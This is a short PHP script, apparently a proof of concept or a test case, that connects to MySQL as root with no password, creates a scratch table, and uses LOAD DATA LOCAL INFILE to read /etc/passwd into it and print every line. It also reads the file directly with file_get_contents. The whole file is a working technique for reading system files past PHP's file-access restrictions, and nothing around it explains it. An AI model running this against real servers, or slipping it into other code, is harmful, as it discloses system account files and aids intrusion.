<?php

file_get_contents('/etc/passwd');

$l = mysql_connect("localhost", "root");
mysql_query("CREATE DATABASE a");
mysql_query("CREATE TABLE a.a (a varchar(1024))");
mysql_query("GRANT SELECT,INSERT ON a.a TO 'aaaa'@'localhost'");
mysql_close($l); mysql_connect("localhost", "aaaa");

mysql_query("LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE a.a");

$result = mysql_query("SELECT a FROM a.a");
while(list($row) = mysql_fetch_row($result))
    print $row . chr(10);

?>
